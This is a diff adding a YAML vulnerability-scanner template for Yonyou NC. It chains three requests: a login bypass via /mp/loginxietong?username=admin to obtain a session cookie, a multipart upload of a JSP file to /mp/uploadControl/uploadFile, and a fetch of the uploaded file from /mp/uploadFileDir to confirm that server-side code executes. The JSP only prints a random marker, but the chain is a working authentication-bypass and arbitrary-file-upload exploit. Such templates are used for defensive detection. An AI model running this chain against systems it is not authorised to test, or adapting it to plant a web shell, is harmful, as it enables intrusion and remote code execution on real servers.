@@ -1,0 +1,51 @@
+id: yongyouNc-uploadControl-uploadFile
+
+info:
+  name: yongyouNc-uploadControl-uploadFile
+  author: niko
+  severity: critical
+  verified: true
+  description: |
+    用友nc /mp/uploadControl/uploadFile接口存在后台文件上传
+
+set:
+    rboundary: randomLowercase(8)
+    randname: randomLowercase(6)
+    randbody: randomLowercase(6)
+rules:
+  r0:
+    request:
+      method: GET
+      path: /mp/loginxietong?username=admin
+    expression: response.status == 302
+    output:
+      search: '"JSESSIONID=(?P<cookie>.*?);".bsubmatch(response.raw_header)'
+      var_cookie: search["cookie"]
+
+  r1:
+    request:
+      method: POST
+      path: /mp/uploadControl/uploadFile
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+        Cookie: "JSESSIONID={{var_cookie}}"
+      body: "\r\n
+        ------WebKitFormBoundary{{rboundary}}\r\n\
+        Content-Disposition: form-data; name=\"file\"; filename=\"{{randname}}.jsp\"\r\n\
+        Content-Type: application/octet-stream\r\n\
+        \r\n\
+        <% out.print(\"{{randbody}}\");%>\r\n\
+        ------WebKitFormBoundary{{rboundary}}\r\n\
+        Content-Disposition: form-data; name=\"submit\"\r\n\
+        \r\n
+        submit\r\n\
+        ------WebKitFormBoundary{{rboundary}}--\r\n\
+        "
+    expression: response.status == 200 && response.body.bcontains(b"{\"forbidden\":true,\"msg\":\"null\"}")
+  r2:
+    request:
+      method: GET
+      path: /mp/uploadFileDir/{{randname}}.jsp
+    expression: response.status == 200 && response.body.bcontains(bytes(randbody))
+     
+expression: r0() && r1() && r2()
